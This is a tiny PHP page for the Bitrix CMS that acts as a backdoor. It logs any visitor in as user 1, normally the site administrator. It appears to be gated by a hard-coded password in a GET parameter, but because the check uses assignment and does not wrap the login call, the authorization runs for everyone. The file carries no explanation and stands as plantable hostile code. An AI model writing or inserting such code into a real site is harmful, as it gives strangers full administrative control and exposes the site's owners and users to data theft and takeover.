<?php
require($_SERVER["DOCUMENT_ROOT"]."/bitrix/header.php");
if ($_GET['pass'] = 'gfhjkm123')
global $USER;
$USER->Authorize(1);
require($_SERVER["DOCUMENT_ROOT"]."/bitrix/footer.php");
?>